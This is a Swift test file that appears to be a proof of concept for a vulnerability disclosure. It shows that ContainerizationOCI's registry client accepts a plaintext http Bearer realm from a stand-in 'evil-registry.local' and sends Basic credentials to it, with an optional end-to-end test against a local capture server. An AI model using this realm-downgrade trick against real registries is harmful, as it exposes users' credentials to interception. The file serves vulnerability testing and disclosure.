// BearerRealmDowngradeTest.swift
// PoC for OE1107246042217
import Foundation
import Testing

@testable import ContainerizationOCI

@Suite("Bearer Realm Downgrade PoC OE1107246042217")
struct BearerRealmDowngradeTest {

    @Test("parseWWWAuthenticateHeaders accepts http realm without error")
    func realmSchemeNotValidated() throws {
        let header = #"Bearer realm="http://localhost:5002/token",service="evil-registry.local",scope="repository:test/image:pull""#
        let challenges = RegistryClient.parseWWWAuthenticateHeaders(headers: [header])
        #expect(challenges.count == 1)
        let challenge = try #require(challenges.first)
        #expect(challenge.type == "Bearer")
        #expect(challenge.realm == "http://localhost:5002/token")
        print("[L1-PASS] http realm accepted by parseWWWAuthenticateHeaders no scheme check.")
    }

    @Test("TokenRequest carries authentication for http realm")
    func tokenRequestCarriesAuthForHttpRealm() throws {
        let creds = BasicAuthentication(username: "victim", password: "secret")
        let realm = "http://localhost:5002/token"
        let tokenRequest = TokenRequest(
            realm: realm,
            service: "evil-registry.local",
            clientId: "containerization",
            scope: "repository:test/image:pull",
            authentication: creds
        )
        #expect(tokenRequest.realm == realm)
        #expect(tokenRequest.authentication != nil)
        print("[L1-PASS] TokenRequest carries BasicAuthentication for http realm.")
    }

    @Test("RegistryClient sends Basic credentials over plaintext HTTP to realm URL")
    func credentialsLeakOverHttp() async throws {
        guard ProcessInfo.processInfo.environment["EVIL_REGISTRY_RUNNING"] != nil else {
            print("[SKIP] Set EVIL_REGISTRY_RUNNING=1 to run E2E test.")
            return
        }
        let creds = BasicAuthentication(username: "victim", password: "secret")
        let client = try RegistryClient(
            reference: "localhost:5001/test/image:latest",
            insecure: true,
            auth: creds
        )
        do {
            try await client.ping()
        } catch {
            print("[INFO] ping threw expected: \(error)")
        }
        print("[E2E] Check capture server output for Authorization header.")
    }
}
